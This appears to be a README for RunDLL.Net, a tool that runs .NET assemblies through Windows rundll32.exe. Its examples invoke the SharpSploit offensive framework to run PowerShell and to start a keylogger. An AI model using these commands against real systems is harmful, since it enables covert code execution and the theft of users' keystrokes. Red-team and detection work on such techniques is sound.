 ## RunDLL.Net
Execute .Net assemblies using Rundll32.exe

 ### Usage:
```
rundll32 Rundll.Net.dll,main <assembly> <class> <method> [(type)][arg1] [(type)][arg2]...
rundll32 Rundll.Net.dll,main C:\Program.dll MyProgram.Program DoThing "Example string" (bool)true (int)3
```

 ### Examples:
 ```
rundll32.exe Rundll.Net.dll,main C:\Temp\SharpSploit.dll SharpSploit.Execution.Shell PowerShellExecute "ls C:\\" (bool)true (bool)false (bool)false
rundll32.exe Rundll.Net.dll,main C:\Temp\SharpSploit.dll SharpSploit.Enumeration.Keylogger StartKeylogger (int)3 
 ```

### How to
To succesfully be loaded, classes and method invoked must be made public and static.
DLL and EXE assemblies can be loaded.
